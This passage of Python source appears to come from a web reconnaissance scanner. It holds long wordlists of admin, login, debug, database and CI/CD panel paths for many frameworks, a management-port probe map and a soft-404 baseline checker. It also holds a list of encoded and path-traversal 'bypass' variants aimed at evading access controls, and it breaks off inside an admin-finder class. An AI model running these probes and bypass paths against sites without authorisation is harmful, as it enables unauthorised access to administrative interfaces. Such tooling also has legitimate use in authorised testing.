        "/useradmin","/admincontrol.php","/adminpanel.php",
        "/bigadmin","/newsadmin","/cmsadmin","/navSiteAdmin","/power_user",
        "/admin/login.php","/admin/login.html","/login/admin",
        "/admin.html","/login.html","/admin.asp","/login.asp",
        "/admin.aspx","/login.aspx","/admin.jsp","/login.jsp",
        "/admin.cgi","/login.cgi","/admin.pl","/login.pl",
        "/admin/login.aspx","/admin/login.jsp","/admin/login.cgi",
        "/administrator","/administrator/","/administrator/index.php",
        "/administrator/login.php","/administrator/admin.php",
        "/controlpanel.php","/controlpanel.html","/controlpanel/",
        "/webadmin","/webadmin/","/webadmin/index.php",
        "/webmaster","/webmaster/","/webmaster/login",
        "/sysadmin","/sysadmin/","/sysadmin/login",
        "/moderator","/moderator/","/moderator/index.php",
        "/operator","/operator/","/operator/login",
        "/supervisor","/supervisor/","/supervisor/login",
        "/hr","/hr/","/hr/login","/staff/login","/staff/",
        "/employees","/employees/","/employees/login",
        "/member","/member/","/members","/members/","/members/login",
        "/user","/user/","/users","/users/","/users/login",
        "/account","/account/","/accounts","/accounts/",
        "/profile","/profile/","/settings","/settings/",
        "/config","/config/","/configuration","/configuration/",
        "/admincp","/admincp/","/admincp/index.php",
        "/admincontrol","/admincontrol/","/admincontrol/login",
        "/admin1","/admin2","/admin3","/admin4","/admin5",
        "/admina","/adminb","/adminc","/admind","/admine",
        "/adminx","/adminy","/adminz",
        "/login1","/login2","/login3","/login4","/login5",
        "/administrator1","/administrator2","/administrator3",
        "/adminpanel/","/adminpanel/index.php","/adminpanel/login.php",
        "/admin_area/","/admin_area/index.php","/admin_area/login.php",
        "/admin_area/admin.php","/admin_area/login.html",
        "/admin/index.html","/admin/login.html","/admin/home.html",
        "/admin/home.php","/admin/index.htm","/admin/login.htm",
        "/adminarea/","/adminarea/index.php","/adminarea/login.php",
        "/admin_area/","/admin_area/index.html","/admin_area/index.htm",
        "/cms","/cms/","/cms/admin","/cms/login","/cms/admin.php",
        "/cms/admin/index.php","/cms/login.php","/cms/admin/login.php",
        "/panel/","/panel/index.php","/panel/login.php","/panel/admin.php",
        "/control/","/control/index.php","/control/login.php","/control/admin.php",
        "/dashboard/","/dashboard/index.php","/dashboard/login.php",
        "/dashboard/admin.php","/dashboard/home.php",
        "/backend/","/backend/index.php","/backend/login.php",
        "/backend/admin.php","/backend/dashboard.php",
        "/manage/","/manage/index.php","/manage/login.php","/manage/admin.php",
        "/management","/management/","/management/login","/management/admin",
        "/manager/","/manager/index.php","/manager/login.php",
        "/adminpanel/","/adminpanel/index.html","/adminpanel/login.html",
        "/administrator/","/administrator/index.html",
        "/administrator/login.html","/administrator/admin.html",
    ],
    "WordPress": [
        # ── Admin login / dashboard panels ONLY ──────────────────────
        "/wp-admin","/wp-login.php","/wp-admin/","/wp-login",
        "/wp-admin/admin.php","/wp-admin/setup-config.php",
        "/wp-admin/admin-ajax.php","/wp-admin/options-general.php",
        "/wp-admin/user-new.php","/wp-admin/install.php",
        "/wp-admin/upgrade.php","/wp-admin/plugins.php",
        "/wp-admin/themes.php","/wp-admin/users.php",
        "/wp-admin/tools.php","/wp-admin/options.php",
        "/wp-admin/options-writing.php","/wp-admin/options-reading.php",
        "/wp-admin/options-discussion.php","/wp-admin/options-media.php",
        "/wp-admin/options-permalink.php","/wp-admin/options-privacy.php",
        "/wp-admin/edit.php","/wp-admin/edit-comments.php",
        "/wp-admin/upload.php","/wp-admin/media-new.php",
        "/wp-admin/media.php","/wp-admin/export.php",
        "/wp-admin/import.php","/wp-admin/site-health.php",
        "/wp-admin/customize.php","/wp-admin/nav-menus.php",
        "/wp-admin/widgets.php","/wp-admin/plugin-install.php",
        "/wp-admin/theme-install.php","/wp-admin/update-core.php",
        "/wp-admin/update.php",
        # ── Network / Multisite admin ─────────────────────────────────
        "/wp-admin/network/","/wp-admin/network/admin.php",
        "/wp-admin/network/settings.php","/wp-admin/network/sites.php",
        "/wp-admin/network/users.php","/wp-admin/network/themes.php",
        "/wp-admin/network/plugins.php","/wp-admin/network/upgrade.php",
        "/wp-admin/ms-admin.php","/wp-admin/ms-sites.php",
        "/wp-admin/ms-users.php","/wp-admin/ms-themes.php",
        "/wp-admin/ms-options.php","/wp-admin/ms-delete-site.php",
        # ── WP login in sub-directories ──────────────────────────────
        "/wordpress/wp-admin","/wordpress/wp-admin/","/wordpress/wp-login.php",
        "/blog/wp-admin","/blog/wp-admin/","/blog/wp-login.php",
        "/new/wp-admin/","/new/wp-login.php",
        "/old/wp-admin/","/old/wp-login.php",
        "/wp/wp-admin/","/wp/wp-login.php",
        "/cms/wp-admin/","/cms/wp-login.php",
        "/site/wp-admin/","/site/wp-login.php",
        "/shop/wp-admin/","/shop/wp-login.php",
    ],
    "Joomla": [
        # ── Admin login / control panel ONLY ──────────────────────────
        "/administrator","/administrator/","/administrator/index.php",
        "/administrator/login.php",
        "/joomla/administrator","/joomla/administrator/index.php",
        "/cms/administrator",
        "/index.php?option=com_users&view=login",
        "/index.php?option=com_login","/index.php?option=com_admin",
        "/administrator/index.php?option=com_login",
        "/administrator/index.php?option=com_cpanel",
        "/administrator/index.php?option=com_config",
        "/administrator/index.php?option=com_users",
        "/administrator/index.php?option=com_plugins",
        "/administrator/index.php?option=com_templates",
        "/administrator/index.php?option=com_modules",
        "/administrator/index.php?option=com_menus",
        "/administrator/index.php?option=com_installer",
        "/administrator/index.php?option=com_languages",
        "/administrator/index.php?option=com_content",
    ],
    "Drupal": [
        # ── Admin login / control panel ONLY ──────────────────────────
        "/user/login","/user/password","/user/register",
        "/user","/user/","/user/1","/user/1/edit",
        "/drupal/user/login",
        "/admin/","/admin","/admin/help",
        "/admin/config","/admin/content","/admin/people",
        "/admin/reports","/admin/structure","/admin/modules",
        "/admin/themes","/admin/appearance",
        "/admin/people/permissions","/admin/people/roles",
        "/admin/config/development/performance",
        "/admin/config/development/logging",
        "/admin/reports/status","/admin/reports/dblog",
        "/admin/reports/updates",
        "/admin/structure/types","/admin/structure/views",
        "/admin/structure/block","/admin/structure/menu",
        "/admin/structure/taxonomy",
        "/admin/content/node","/admin/content/comment",
        "/drupal/admin",
        "/?q=user/login","/?q=admin/config","/?q=admin/content",
        "/index.php?q=user/login","/index.php?q=admin/config",
    ],
    "Magento": [
        "/admin","/adminhtml","/admin123","/magento/admin",
        "/index.php/admin","/store/admin","/shop/admin",
        "/admin/dashboard","/admin/sales","/admin/catalog",
        "/admin/customer","/admin/system_config","/admin/promo",
        "/admin/cms","/admin/reports","/admin/stores",
        "/admin/system","/admin/permissions","/admin/extensions",
        "/admin/cache","/admin/indexer","/admin/urlrewrite",
        "/admin/newsletter","/admin/tax","/admin/rating",
        "/admin/review","/admin/search","/admin/user",
        "/admin/dashboard/","/admin/sales_order/",
        "/admin/catalog_product/","/admin/customer/index/",
        "/admin/system_config/edit/",
        "/index.php/admin","/index.php/adminhtml",
        "/index.php/admin/dashboard","/index.php/downloader",
        "/admin/Admin/","/admin/Adminhtml/",
    ],
    "Laravel/PHP": [
        # ── Admin login / panels ──────────────────────────────────────
        "/admin/login","/admin/dashboard","/admin-panel",
        "/backend/login","/dashboard/login","/auth/admin",
        "/login.php","/admin.php","/panel.php","/manage.php",
        "/admin/login.php","/admin/dashboard.php","/admin/panel.php",
        "/admin/index.php","/admin/home.php","/admin/main.php",
        "/admin/control.php","/admin/manage.php",
        # ── Laravel debug panels (admin-accessible) ───────────────────
        "/telescope","/telescope/","/horizon","/horizon/",
        "/_ignition/health-check","/_ignition/execute-solution",
        "/api/user","/api/login","/api/register",
        "/api/password/reset","/api/password/email",
    ],
    "Django": [
        # ── Admin login / panel ONLY ───────────────────────────────────
        "/admin/","/admin/login/","/admin/logout/","/admin/password_change/",
        "/accounts/login/","/accounts/logout/","/accounts/password_reset/",
        "/accounts/password_change/","/accounts/register/",
        "/admin/auth/user/","/admin/auth/group/","/admin/sites/site/",
        "/django-admin/",
        "/api/auth/","/api/token/","/api/token/refresh/",
        "/__debug__/","/__debug__/sql/","/__debug__/settings/",
        "/silk/","/silk/requests/","/silk/sql/",
    ],
    "Ruby on Rails": [
        # ── Admin login / panels ONLY ──────────────────────────────────
        "/admin","/admin/","/admin/login","/admin/dashboard",
        "/administrator","/login","/logout","/signin","/signup",
        "/users/sign_in","/users/sign_up","/users/password/new",
        # ── Rails debug / background jobs panels ─────────────────────
        "/rails/info","/rails/info/properties","/rails/info/routes",
        "/rails/mailers","/rails/conductor",
        "/sidekiq","/sidekiq/","/delayed_job",
        "/resque","/resque/overview","/resque/working",
    ],
    "Spring Boot": [
        "/actuator","/actuator/","/actuator/health","/actuator/info",
        "/actuator/metrics","/actuator/env","/actuator/beans",
        "/actuator/configprops","/actuator/mappings","/actuator/loggers",
        "/actuator/threaddump","/actuator/heapdump","/actuator/shutdown",
        "/actuator/auditevents","/actuator/httptrace","/actuator/scheduledtasks",
        "/actuator/caches","/actuator/conditions","/actuator/flyway",
        "/actuator/liquibase","/actuator/sessions","/actuator/quartz",
        "/actuator/startup","/actuator/prometheus","/actuator/metrics/jvm.memory.used",
        "/env","/health","/info","/metrics","/beans","/configprops",
        "/mappings","/loggers","/threaddump","/heapdump","/shutdown",
        "/swagger-ui.html","/swagger-ui/","/swagger-resources/",
        "/v2/api-docs","/v3/api-docs","/webjars/springfox-swagger-ui/",
        "/admin","/admin/","/login","/logout",
        "/api/","/api/v1/","/api/v2/",
        "/console","/h2-console","/h2-console/",
        "/jolokia","/jolokia/","/jolokia/read/",
    ],
    "API / GraphQL": [
        "/api/admin","/api/dashboard","/graphql","/graphiql",
        "/admin/api","/backend/api","/api/v1/admin","/api/v2/admin",
        "/swagger","/swagger-ui","/api-docs","/openapi.json",
        "/swagger.json","/console","/api/v1/users","/api/v1/config",
        "/rest/admin","/api/login","/api/auth",
        "/swagger-ui.html","/swagger-ui/index.html",
        "/swagger-resources","/v2/api-docs","/v3/api-docs",
        "/openapi.yaml","/openapi.yml","/api-docs.json",
        "/api/","/api/v1/","/api/v2/","/api/v3/",
        "/api/health","/api/status","/api/version",
        "/api/config","/api/settings","/api/users",
        "/api/user","/api/profile","/api/me",
        "/graphql/console","/graphql/playground",
        "/altair","/voyager","/graphql/schema",
        "/api/graphql","/gql","/query",
        "/postman","/postman/collection","/api-collection",
        "/api/swagger.json","/api/openapi.json",
        "/api/docs","/api/documentation","/api/reference",
    ],
    "cPanel/Hosting": [
        "/cpanel","/whm","/webmail","/plesk","/ispconfig",
        "/directadmin","/vesta","/serveradmin","/webadmin",
        # cPanel
        ("http",2082,"/"),  ("http",2082,"/login/"),
        ("https",2083,"/"), ("https",2083,"/login/"),
        ("http",2086,"/"),  ("http",2086,"/login/"),
        ("https",2087,"/"), ("https",2087,"/login/"),
        ("http",2095,"/"),  ("https",2096,"/"),
        # Plesk
        ("https",8443,"/login_up.php3"), ("https",8443,"/"),
        ("https",8443,"/login/"), ("https",8443,"/smb/"),
        # DirectAdmin
        ("http",2222,"/"),  ("https",2222,"/"),
        ("https",2222,"/CMD_LOGIN"), ("https",2222,"/CMD_ACCOUNT_ADMIN"),
        # Webmin / Usermin
        ("https",10000,"/"), ("https",20000,"/"),
        ("https",10000,"/session_login.cgi"),
        ("https",20000,"/session_login.cgi"),
        # ISPConfig
        ("https",8080,"/"), ("https",8081,"/"),
        ("https",8080,"/login/"), ("https",8081,"/login/"),
        # VestaCP
        ("https",8083,"/"), ("https",8443,"/login/"),
        ("https",8083,"/login/"),
        # cPanel API
        ("https",2083,"/frontend/paper_lantern/index.html"),
        ("https",2083,"/frontend/jupiter/index.html"),
        ("https",2087,"/scripts/command"),
        ("https",2087,"/xml-api/"),
    ],
    "Database": [
        "/phpmyadmin","/pma","/sqladmin","/mysql","/dbadmin",
        "/database","/myadmin","/phpMyAdmin","/phpbb","/pgadmin",
        "/phppgadmin","/adminer","/adminer.php","/db",
        "/mysql/index.php","/pma/index.php","/phpMyAdmin/index.php",
        "/phpmyadmin/","/phpmyadmin/index.php","/phpmyadmin/setup/",
        "/phpmyadmin/scripts/setup.php","/phpmyadmin/Documentation.html",
        "/phpmyadmin/README","/phpmyadmin/ChangeLog",
        "/phpMyAdmin/","/phpMyAdmin/index.php",
        "/pma/","/pma/index.php","/pma/setup/",
        "/adminer/","/adminer/index.php","/adminer.php",
        "/adminer-4.8.1.php","/adminer-4.8.0.php",
        "/adminer-4.7.9.php","/adminer-4.7.8.php",
        "/mysql/","/mysql/index.php","/mysql/admin/",
        "/myadmin/","/myadmin/index.php",
        "/sqladmin/","/sqladmin/index.php",
        "/dbadmin/","/dbadmin/index.php",
        "/pgadmin/","/pgadmin/index.php","/pgadmin4/",
        "/phppgadmin/","/phppgadmin/index.php",
        "/db/","/db/index.php","/db/admin/",
        "/database/","/database/index.php",
        "/mongo","/mongo/","/mongodb","/mongodb/",
        "/redis","/redis/","/redisadmin","/redisadmin/",
        "/memcached","/memcached/",
        "/elasticsearch","/elasticsearch/","/_cat/","/_cluster/",
        "/_nodes/","/_search","/_stats",
        "/couchdb","/couchdb/","/_utils/",
        "/influxdb","/influxdb/","/query",
        "/clickhouse","/clickhouse/","/play",
        "/cassandra","/cassandra/",
        "/neo4j","/neo4j/","/browser/",
        "/orientdb","/orientdb/",
        "/solr","/solr/","/solr/admin/",
        "/rabbitmq","/rabbitmq/","/rabbitmq/management/",
        "/kibana","/kibana/","/app/kibana",
        "/grafana","/grafana/","/grafana/login",
    ],
    "CI/CD & DevOps": [
        "/jenkins","/jenkins/","/jenkins/login","/jenkins/script",
        "/jenkins/manage","/jenkins/configure","/jenkins/computer/",
        "/gitlab","/gitlab/","/gitlab/users/sign_in",
        "/gitlab/admin","/gitlab/explore",
        "/github","/github/","/github/login",
        "/bitbucket","/bitbucket/","/bitbucket/login",
        "/gitea","/gitea/","/gitea/user/login",
        "/gogs","/gogs/","/gogs/user/login",
        "/drone","/drone/","/drone/login",
        "/travis","/travis/","/travis-ci",
        "/circleci","/circleci/",
        "/teamcity","/teamcity/","/teamcity/login.html",
        "/bamboo","/bamboo/","/bamboo/userlogin.action",
        "/buildbot","/buildbot/","/buildbot/waterfall",
        "/cruisecontrol","/cruisecontrol/",
        "/hudson","/hudson/","/hudson/login",
        "/ansible","/ansible/","/ansible/tower/",
        "/awx","/awx/","/awx/login",
        "/rundeck","/rundeck/","/rundeck/user/login",
        "/salt","/salt/","/saltstack/",
        "/puppet","/puppet/","/puppet/console/",
        "/chef","/chef/","/chef/manage/",
        "/nagios","/nagios/","/nagios/cgi-bin/",
        "/zabbix","/zabbix/","/zabbix/index.php",
        "/prometheus","/prometheus/","/prometheus/graph",
        "/alertmanager","/alertmanager/","/alertmanager/#/alerts",
        "/consul","/consul/","/consul/ui/",
        "/vault","/vault/","/vault/ui/",
        "/nomad","/nomad/","/nomad/ui/",
        "/kubernetes","/kubernetes/","/k8s/",
        "/rancher","/rancher/","/rancher/login",
        "/portainer","/portainer/","/portainer/#!/login",
        "/swarm","/swarm/","/swarm/visualizer/",
        "/docker","/docker/","/docker/containers",
        "/sonarqube","/sonarqube/","/sonarqube/about",
        "/nexus","/nexus/","/nexus/#admin",
        "/artifactory","/artifactory/","/artifactory/webapp/",
        "/jfrog","/jfrog/","/jfrog/ui/",
    ],
    "Monitoring & Dashboards": [
        "/grafana","/grafana/","/grafana/login","/grafana/dashboard/",
        "/kibana","/kibana/","/kibana/app/","/kibana/app/kibana",
        "/prometheus","/prometheus/","/prometheus/graph",
        "/alertmanager","/alertmanager/","/alertmanager/#/alerts",
        "/zabbix","/zabbix/","/zabbix/index.php","/zabbix/zabbix.php",
        "/nagios","/nagios/","/nagios/cgi-bin/","/nagiosxi/",
        "/icinga","/icinga/","/icingaweb2/","/icinga2/",
        "/librenms","/librenms/","/librenms/login",
        "/observium","/observium/","/observium/login",
        "/cacti","/cacti/","/cacti/index.php",
        "/munin","/munin/","/munin/index.html",
        "/netdata","/netdata/","/netdata/index.html",
        "/glances","/glances/","/glances/",
        "/phpmyadmin","/phpmyadmin/","/phpMyAdmin/",
        "/adminer","/adminer/","/adminer.php",
        "/elasticsearch","/elasticsearch/","/_cat/",
        "/kibana","/kibana/","/app/kibana",
        "/graylog","/graylog/","/graylog/login",
        "/sentry","/sentry/","/sentry/login",
        "/bugsnag","/bugsnag/","/bugsnag/login",
        "/rollbar","/rollbar/","/rollbar/login",
        "/newrelic","/newrelic/","/newrelic/login",
        "/datadog","/datadog/","/datadog/login",
        "/splunk","/splunk/","/splunk/en-US/account/login",
        "/logstash","/logstash/","/logstash/",
        "/fluentd","/fluentd/","/fluentd/",
        "/jaeger","/jaeger/","/jaeger/search",
        "/zipkin","/zipkin/","/zipkin/",
    ],
    "Bypass Paths": [
        "/admin/","/admin//","/admin/./","//admin/",
        "/ADMIN","/Admin","/%61dmin","/admin%00",
        "/admin;/","/admin..;/","/.;/admin",
        "/;/admin","/admin%20","/admin%09","/admin%0a",
        "/%2fadmin","/admin%2f","/./admin",
        "/admin/.","/admin/..","/admin/../","/admin/../../",
        "/admin/./","/admin/./login","/admin/../login",
        "/admin;/","/admin;/login","/admin%3b/","/admin%3b/login",
        "/admin%3b/","/admin%3b/login","/admin%00/","/admin%00/login",
        "/admin%20/","/admin%20/login","/admin%09/","/admin%09/login",
        "/admin%0a/","/admin%0a/login","/admin%0d/","/admin%0d/login",
        "/admin%0d%0a/","/admin%0d%0a/login",
        "/%2e/admin","/%2e/admin/","/%2e/admin/login",
        "/%2e%2e/admin","/%2e%2e/admin/","/%2e%2e/admin/login",
        "/%252e/admin","/%252e/admin/","/%252e/admin/login",
        "/%252e%252e/admin","/%252e%252e/admin/","/%252e%252e/admin/login",
        "/admin%2f","/admin%2f/","/admin%2f/login",
        "/admin%5c","/admin%5c/","/admin%5c/login",
        "/admin%252f","/admin%252f/","/admin%252f/login",
        "/admin%255c","/admin%255c/","/admin%255c/login",
        "/admin/.","/admin/..","/admin/...","/admin/....",
        "/admin%2e","/admin%2e/","/admin%2e/login",
        "/admin%2e%2e","/admin%2e%2e/","/admin%2e%2e/login",
        "/admin%252e","/admin%252e/","/admin%252e/login",
        "/admin%252e%252e","/admin%252e%252e/","/admin%252e%252e/login",
    ],
    "Log & Debug (Panels)": [
        # ── Actual admin/developer web panels (NOT raw log files) ──────
        # Laravel debug panels
        "/telescope","/telescope/","/telescope/requests",
        "/telescope/exceptions","/telescope/logs",
        "/telescope/queries","/telescope/mail",
        "/telescope/redis","/telescope/gates",
        "/telescope/schedule","/telescope/commands",
        "/horizon","/horizon/","/horizon/dashboard",
        "/horizon/jobs","/horizon/metrics","/horizon/commands",
        # Symfony profiler
        "/_profiler/","/_profiler/phpinfo","/_profiler/latest",
        "/_profiler/exception","/_profiler/router",
        "/_profiler/events","/_profiler/translation",
        "/_profiler/security","/_profiler/request",
        "/_profiler/config","/_profiler/cache",
        # PHP Clockwork
        "/clockwork","/clockwork/","/clockwork/app",
        "/__clockwork/","/__clockwork/latest",
        # Ignition (Laravel error page)
        "/_ignition/health-check","/_ignition/execute-solution",
        # PHP info / debug scripts (web accessible pages)
        "/phpinfo","/phpinfo.php","/info.php","/test.php",
        "/debug.php","/status.php","/health.php","/ping.php",
        # Server status pages
        "/server-status","/server-info","/server-status?auto",
        "/nginx_status","/nginx-status","/stub_status",
        # PHP Cache admin panels
        "/apc.php","/apc/","/opcache.php","/opcache-status.php",
        "/memcache.php","/memcached.php","/memcacheadmin.php",
        "/phpmemcacheadmin.php","/phpredisadmin.php","/redisadmin.php",
        "/adminer.php","/adminer/","/adminer",
        # Django / Rails debug
        "/debug/","/debug/default/view","/debug/toolbar",
        "/__debug__/","/__debug__/sql/","/__debug__/settings/",
        "/silk/","/silk/requests/","/silk/sql/",
        "/rails/info","/rails/info/properties","/rails/info/routes",
    ],
    "CMS Generic": [
        "/cms","/cms/","/cms/admin","/cms/login",
        "/cms/admin.php","/cms/login.php","/cms/admin/login.php",
        "/cms/admin/index.php","/cms/admin/dashboard.php",
        "/cms/index.php","/cms/home.php","/cms/main.php",
        "/cms/manage.php","/cms/control.php","/cms/panel.php",
        "/cms/config.php","/cms/settings.php","/cms/install.php",
        "/cms/setup.php","/cms/upgrade.php","/cms/update.php",
        "/cms/backup/","/cms/backups/","/cms/db/",
        "/cms/database/","/cms/logs/","/cms/log/",
        "/admin-cms","/admin_cms","/admincms","/cms-admin",
        "/cmsadmin","/cms_admin","/cms_admin/","/cmsadmin/",
        "/cmsadmin.php","/cms_admin.php","/cms-admin.php",
        "/content","/content/","/content/admin","/content/login",
        "/content/admin.php","/content/login.php",
        "/content/admin/index.php","/content/index.php",
        "/management","/management/","/management/admin",
        "/management/login","/management/admin.php",
        "/management/login.php","/management/index.php",
        "/management/admin/index.php","/management/dashboard.php",
        "/adminmanagement","/admin_management","/admin-management",
        "/adminmanagement/","/admin_management/","/admin-management/",
        "/adminmanagement.php","/admin_management.php",
        "/admin-management.php",
    ],
}

# Management port probe map (used when live ports are discovered)
MANAGEMENT_PORT_PROBE = {
    2082:  [("http","/"),("http","/login/")],
    2083:  [("https","/"),("https","/login/")],
    2086:  [("http","/"),("http","/login/")],
    2087:  [("https","/"),("https","/login/")],
    2095:  [("http","/")],
    2096:  [("https","/")],
    8443:  [("https","/"),("https","/login_up.php3"),("https","/login/"),("https","/smb/")],
    2222:  [("http","/"),("https","/"),("https","/CMD_LOGIN")],
    10000: [("https","/"),("http","/"),("https","/session_login.cgi")],
    20000: [("https","/"),("https","/session_login.cgi")],
    8080:  [("http","/"),("http","/admin"),("https","/"),("https","/login/")],
    8081:  [("http","/"),("https","/"),("https","/login/")],
    8083:  [("https","/"),("https","/login/")],
    9090:  [("https","/"),("http","/")],
    8888:  [("http","/"),("https","/")],
    5000:  [("http","/"),("https","/")],
    3000:  [("http","/"),("https","/")],
    8000:  [("http","/"),("https","/")],
    9000:  [("http","/"),("https","/")],
    50000: [("http","/"),("https","/")],
}

# ══════════════════════════════════════════════════════
#  BASELINE CHECKER — anti-spam / soft-404 detection
# ══════════════════════════════════════════════════════
class BaselineChecker:
    """
    Probes random non-existent paths to fingerprint site behavior.
    Detects: soft-404, catch-all redirects, universal-200 honeypots.
    Provides is_false_positive() to filter scanner noise.
    """

    def __init__(self, url: str, engine: Engine):
        self.url        = url.rstrip('/')
        self.engine     = engine
        self.mode       = "normal"      # normal|soft404|catchall|universal200
        self.home_hash  = ""
        self.home_size  = 0
        self.home_title = ""
        self.home_status= 0
        self.samples    : List[dict] = []
        self._done      = False
        self._fp_hashes : Set[str]  = set()

    # ── Build homepage fingerprint + 3 random probes ─────────────────
    def fingerprint(self) -> bool:
        """
        Returns True if site behaves normally (proper 404s),
        False if anomaly detected that may inflate scan results.
        """
        import string as _string

        # Unique random path suffixes that definitely won't exist
        rand_paths = [
            f"/z{''.join(random.choices(_string.ascii_lowercase, k=9))}-dne/",
            f"/fake-probe-{''.join(random.choices(_string.digits, k=7))}.php",
            f"/{''.join(random.choices(_string.ascii_lowercase, k=6))}/nope/dne/",
        ]

        # Get homepage baseline
        r_home = self.engine.get(self.url)
        if r_home:
            self.home_status = r_home.status_code
            self.home_hash   = hashlib.md5(r_home.content).hexdigest()
            self.home_size   = len(r_home.content)
            m = re.search(r'<title[^>]*>([^<]*)</title>', r_home.text, re.I)
            self.home_title  = m.group(1).strip()[:80] if m else ""

        # Probe random non-existent paths
        for path in rand_paths:
            r = self.engine.get(f"{self.url}{path}")
            if not r:
                self.samples.append({'path': path, 'status': None})
                continue
            h    = hashlib.md5(r.content).hexdigest()
            size = len(r.content)
            loc  = r.headers.get('Location', '')
            m    = re.search(r'<title[^>]*>([^<]*)</title>', r.text, re.I)
            title = m.group(1).strip()[:80] if m else ""
            parsed_loc = urlparse(loc) if loc else None
            redir_home = (r.status_code in (301,302,307,308) and
                          parsed_loc is not None and
                          parsed_loc.path in ('', '/') and
                          parsed_loc.netloc in ('', urlparse(self.url).netloc))
            same_hash  = (h == self.home_hash and self.home_hash != "")
            size_diff  = abs(size - self.home_size) / max(self.home_size, 1)
            same_title = (title == self.home_title and title != "")
            soft_match = same_hash or (size_diff < 0.04 and same_title)

            self.samples.append({
                'path':       path,
                'status':     r.status_code,
                'size':       size,
                'hash':       h,
                'location':   loc[:60] if loc else '',
                'title':      title,
                'redir_home': redir_home,
                'soft_match': soft_match,
            })
            # Register as known false-positive hash
            if soft_match or redir_home:
                self._fp_hashes.add(h)

        self._done = True
        return self._compute_mode()

    def _compute_mode(self) -> bool:
        valid = [s for s in self.samples if s.get('status') is not None]
        if not valid:
            self.mode = "normal"; return True

        n          = len(valid)
        n_404      = sum(1 for s in valid if s['status'] == 404)
        n_soft     = sum(1 for s in valid if s.get('soft_match'))
        n_redir    = sum(1 for s in valid if s.get('redir_home'))
        n_200      = sum(1 for s in valid if s['status'] == 200)

        if n_redir == n:
            self.mode = "catchall"
        elif n_soft >= 2:
            self.mode = "soft404"
        elif n_200 == n and n_404 == 0:
            self.mode = "universal200"
        else:
            self.mode = "normal"

        return self.mode == "normal"

    # ── False-positive test for any scanner response ─────────────────
    def is_false_positive(self, resp, strict: bool = False) -> bool:
        """Return True if response looks like a soft-404 / catch-all."""
        if not resp or not self._done:
            return False
        sc   = resp.status_code
        h    = hashlib.md5(resp.content).hexdigest()
        size = len(resp.content)
        loc  = resp.headers.get('Location', '')

        # Known false-positive hash
        if h in self._fp_hashes:
            return True

        if self.mode == "catchall":
            parsed_loc = urlparse(loc) if loc else None
            if parsed_loc and parsed_loc.path in ('', '/') and                sc in (301,302,307,308):
                return True

        if self.mode in ("soft404", "universal200"):
            if sc == 200 and self.home_hash:
                if h == self.home_hash:
                    return True
                size_diff = abs(size - self.home_size) / max(self.home_size, 1)
                thresh = 0.03 if not strict else 0.15
                m = re.search(r'<title[^>]*>([^<]*)</title>', resp.text, re.I)
                title = m.group(1).strip()[:80] if m else ""
                if size_diff < thresh and title == self.home_title:
                    return True
                if strict and size_diff < 0.50:
                    return True
        return False

    # ── Human-readable summary ────────────────────────────────────────
    def summary(self) -> str:
        ht = self.home_title[:40]
        lines = [f"  Homepage fingerprint: [{self.home_status}] "
                 f"{self.home_size}b  title:{ht!r}"]
        for s in self.samples:
            if s.get('status') is None:
                lines.append(f"    {s['path'][:40]} → [no response]")
                continue
            flags = ""
            if s.get('soft_match'): flags += f" {C.R}[≡ HOMEPAGE]{C.E}"
            if s.get('redir_home'): flags += f" {C.Y}[→ HOME]{C.E}"
            lines.append(f"    {s['path'][:40]} → [{s['status']}] "
                         f"{s['size']}b{flags}")
        return "\n".join(lines)

    # ── Interactive warning / choice ──────────────────────────────────
    MODE_DESC = {
        "soft404":      "Site returns HTTP 200 for ALL paths (soft-404 — same content as homepage)",
        "catchall":     "Site REDIRECTS every unknown path → homepage (catch-all redirect)",
        "universal200": "Site returns HTTP 200 for all random paths (results may include false positives)",
    }

    def warn_and_ask(self, module_name: str) -> str:
        """
        Warn the user and ask how to proceed.
        Returns: 'filter' | 'strict' | 'all' | 'abort'
        """
        sep(f"SITE ANOMALY — {module_name}")
        print(f"  {C.R}[!] Anomalous site behavior detected:{C.E}")
        print(f"  {C.Y}{self.MODE_DESC.get(self.mode, self.mode)}{C.E}\n")
        print(self.summary())
        print(f"""
  {C.Y}⚠ Without filtering, this scan will produce many false positives.{C.E}

  {C.CY}How would you like to proceed?{C.E}

  {C.G}[1]{C.E} Smart Filter  — skip responses identical/similar to homepage {C.DIM}(recommended){C.E}
  {C.G}[2]{C.E} Strict Filter — only report responses 50%+ different from homepage
  {C.G}[3]{C.E} No Filter     — show all results {C.DIM}(expect many false positives){C.E}
  {C.G}[4]{C.E} Abort         — skip this scan module entirely
""")
        choice = ask("Your choice [1]:", "1").strip()
        return {'1':'filter','2':'strict','3':'all','4':'abort'}.get(choice,'filter')




class AdminFinder:
    def __init__(self, url, engine: Engine, logger: Logger,
                 threads=None, categories=None, open_ports=None,
                 tech_cats: Optional[List[str]] = None):
        self.url   = url.rstrip('/')
        self.engine= engine
        self.logger= logger
        self.threads = threads or engine.threads
        self.open_ports = open_ports or []
        # If tech-aware categories are provided, prefer them
        if tech_cats:
            self.cats = tech_cats
        else:
            self.cats = categories or list(ADMIN_PATHS.keys())
        self.found : List[dict] = []
        self._lk   = threading.Lock()
        self._done = 0
        self._mutator = PathMutator()

    def _paths(self) -> list:
        out = []
        for cat in self.cats:
            for p in ADMIN_PATHS.get(cat,[]):
                out.append((cat,p))
        # Live port probes
        for op in self.open_ports:
            port = op.get("port")
            if port in MANAGEMENT_PORT_PROBE:
                for scheme, sub in MANAGEMENT_PORT_PROBE[port]:
                    out.append(("Live Port Panel", (scheme, port, sub)))
        return out

    @staticmethod
    def _path_is_valid(path: str) -> bool:
        """Reject meaningless paths before probing."""
        if not isinstance(path, str):
            return True   # tuples handled separately
        if not path.startswith('/') and not path.startswith(':'):
            return False  # must start with / or :port
        # Reject /?filename.ext (no = sign, looks like a file in query)
        if path.startswith('/?') and '=' not in path:
            if re.search(r'\.[a-zA-Z0-9]{2,5}$', path[2:].split('&')[0]):
                return False
        # Reject empty path
        if path in ('', '/') and '?' not in path:
            return False
        return True

    def _resolve(self, cat: str, path) -> str:
        if isinstance(path, tuple):
            scheme, port, sub = path
            parsed = urlparse(self.url)
            return f"{scheme}://{parsed.hostname}:{port}{sub}"
        elif isinstance(path, str) and path.startswith(':'):
            parsed = urlparse(self.url)
            return f"{parsed.scheme}://{parsed.hostname}{path}"
        else:
            return f"{self.url}{path}"

    def _check(self, cat: str, path):
        if isinstance(path, str) and not self._path_is_valid(path):
            return
        full = self._resolve(cat, path)
        resp = self.engine.get(full, method="GET")
        with self._lk: self._done += 1
        if not resp: return

        # ── Baseline filter: skip soft-404 / catch-all responses ──────
        bl = getattr(self, '_baseline', None)
        fm = getattr(self, '_filter_mode', 'filter')
